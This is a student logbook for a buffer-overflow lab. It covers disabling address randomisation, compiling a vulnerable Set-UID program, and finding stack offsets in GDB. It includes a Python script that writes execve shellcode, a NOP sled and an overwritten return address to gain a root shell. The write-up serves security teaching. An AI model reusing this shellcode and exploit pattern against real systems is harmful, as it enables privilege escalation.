# Log Book 5 - Buffer Overflow

## Question 1

### Task 1

This first task was to set up our environment. 
Firstly, we needed to disable the space randomization in order know the exact addresses in this attack. After that, we changed the shell link to /bin/zsh, since our attack is a Set-UID program.
Finally, we compiled the file call_shellcode.c which had two copies of shellcode (32-bit and 64-bit). Both versions allowed us shell access.

![Task 1](/Images/Logbook5/Lab5Task1.png)

### Task 2

In this task, we were asked to compile the program stack.c. Beforehand, we changed the value of L1 to 132 (100 + 8 * 4) inside the Makefile. It's important to note that the Makefile is configured to compile the program with proper flag in order to be able to do the attack.

![Task 2](/Images/Logbook5/Lab5Task2.png)

### Task 3

To exploit the buffer-overflow vulnerability, we had to know the distance between the buffer's starting position and the where the return address is stored.

![Task 3 part 1](/Images/Logbook5/Lab5Task2p3.png)

Also, exploring GDB, we found EBP and BUFFER:

![Task 3 part 2](/Images/Logbook5/Lab5Task2p2.png)

Using the following code in python and the information we got from the ebp value and the buffer's address we could plan our attack:

```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) - 1          # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc97c + start
offset = 0xffffca08 - 0xffffc97c + 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Finally, running the python program as well as the stack program we were able to get a root shell:

![Task 3 part 3](/Images/Logbook5/Lab5Task3.png)

## Question 2

Using the GDB again, we found where the NOPEs are being written. In this case, starts in the address 0xFFFFCE34:

![Question 2 part 1](/Images/Logbook5/Lab5Question2.png)

Additionally, the shellcode should be right at the end of the NOPEs, according to our script file (0xFFFFD01D):

![Question 2 part 2](/Images/Logbook5/Lab5Question2p2.png)

Finally, we calculated the the return address was 0xFFFFCB65, 140 positions after the beginning of the NOPEs:

![Question 2 part 3](/Images/Logbook5/Lab5Question2p3.png)

